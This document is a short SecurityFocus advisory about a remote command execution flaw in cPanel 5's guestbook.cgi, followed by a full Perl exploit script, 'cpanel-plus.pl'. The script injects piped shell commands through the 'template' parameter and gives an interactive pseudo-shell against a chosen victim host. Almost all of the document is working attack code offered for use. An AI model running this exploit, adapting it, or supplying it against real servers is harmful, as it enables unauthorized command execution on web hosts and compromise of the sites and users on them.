source: http://www.securityfocus.com/bid/6882/info
  
A remote command execution vulnerability has been discovered in the cPanel CGI Application. This issue occurs due to insufficient sanitization of externally supplied data to the 'guestbook.cgi' script.
  
An attacker may exploit this vulnerability to execute commands in the security context of the web server hosting the affected script.
  
This vulnerability has been reported to affect cPanel version 5, previous versions may also be affected.

#####################################################
# cpanel-plus.pl exploit
# Spawn bash style Shell on Apache CPANEL
#
# Spabam 2003 PRIV8 code
#
# spax@zone-h.org
# This Script is currently under development
#####################################################
use strict;
use IO::Socket;
my $host;
my $port;
my $command;
my $url;
my @results;
my $probe;
my @U;
my $shit;
$U[1] = "/cgi-sys/guestbook.cgi?user=cpanel&template=|";
&intro;
&scan;
&choose;
&command;
&exit;
sub intro {
&help;
&host;
&server;
sleep 3;
};
sub host {
print "\nHost or IP : ";
$host=<STDIN>;
chomp $host;
if ($host eq ""){$host="127.0.0.1"};
#print "\nPort (enter to accept 80): ";
$shit="|";
$port="80";
chomp $port;
if ($port =~/\D/ ){$port="80"};
if ($port eq "" ) {$port = "80"};
};
sub server {
my $X;
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
#print "\nGet IIS string ...";
$probe = "string";
my $output;
my $webserver = "something";
&connect;
for ($X=0; $X<=10; $X++){
        $output = $results[$X];
        if (defined $output){
        if ($output =~/IIS/){ $webserver = "iis" };
        };
};
if ($webserver ne "iis"){
#print "\a\a\n\nWARNING : UNABLE TO GET IIS STRING.";
#print "\nThis Server may not be running Micro\$oft IIS WebServer";
#print "\n\n\nContinue anyway? ... [Y/N]";
my $choice = "y";
chomp $choice;
if ($choice =~/N/i) {&exit};
            }else{
print "\n\nOK";
        };
};
sub scan {
my $status = "not_vulnerable";
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
#print "\nScanning $host on port $port ...";
my $loop;
my $output;
my $flag;
$command="dir";
for ($loop=1; $loop < @U; $loop++) {
$flag = "0";
$url = $U[$loop];
$probe = "scan";
&connect;
foreach $output (@results){
if ($output =~ /Directory/) {
                              $flag = "1";
                              $status = "vulnerable";
                              };
        };
if ($flag eq "0") {
#print "\nNo URL $loop...";
}else{
print "\a\a\a\n$host VULNERABLE TO URL $loop !!!";
     };
};
if ($status eq "not_vulnerable"){

#"SORRY $host is NOT Vulnerable to this Exploit.";
                                };
};
sub choose {
#print "\nSelect a URL (type 0 to input)";
my $choice="0";
chomp $choice;
if ($choice > @U){ &choose };
if ($choice =~/\D/g ){ &choose };
if ($choice == 0){ &other };
$url = $U[$choice];
#print "\nURL: HTTP://$host$url";
};
sub other {
#print "\nURL [minus command] eg: HTTP://$host\/scripts\/cmd.exe?\/+";
#print "\nHTTP://$host";
my $other = "/cgi-sys/guestbook.cgi?user=cpanel&template=|";
chomp $other;
$U[0] = $other;
};
sub command {
while ($command !~/quit/i) {
#print "\nHELP QUIT URL SCAN Or Command eg dir C: ";
print "\n[$host]\$ ";
$command = <STDIN>;
chomp $command;
if ($command =~/quit/i) { &exit };
if ($command =~/url/i) { &choose };
if ($command =~/scan/i) { &scan };
if ($command =~/help/i) { &help };
$command =~ s/\s/+/g;
#print "HTTP://$host$url$command";
$probe = "command";
if ($command !~/quit|url|scan|help/) {&connect};
};
&exit;
};
sub connect {
my $connection = IO::Socket::INET->new (
                                Proto => "tcp",
                                PeerAddr => "$host",
                                PeerPort => "$port",
                                ) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
$connection -> autoflush(1);
if ($probe =~/command|scan/){
print $connection "GET $url$command$shiz HTTP/1.1\r\nHost: $host\r\n\r\n";
}elsif ($probe =~/string/) {
print $connection "HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n";
};

while ( <$connection> ) {
                        @results = <$connection>;
                         };
close $connection;
if ($probe eq "command"){ &output };
if ($probe eq "string"){ &output };
};
sub output{
#print "\nOUTPUT FROM $host. \n\n";
my $display;
if ($probe eq "string") {
                        my $X;
                        for ($X=0; $X<=10; $X++) {
                        $display = $results[$X];
                        if (defined $display){print "$display";};
                        sleep 1;
                                };
                        }else{
                        foreach $display (@results){
                            print "$display";
                            sleep 1;
                                };
                          };
};
sub exit{
print "\n\n\n
SPABAM 2003.";
print "\nspabam.tk spax\@zone-h.org";
print "\n\n\n";
exit;
};
sub help {
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\n
        CPANEL-PLUS 1.1 by SPABAM spax 2003";
print "\n
";
print "\n A CPANEL EXPLOIT WHICH SPAWN A BASH STYLE SHELL";
print "\n
note.. web directory is normally /var/www/html";
print "\n";
print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
print "\n\n\n\n\n\n\n\n\n\n\n\n";
};
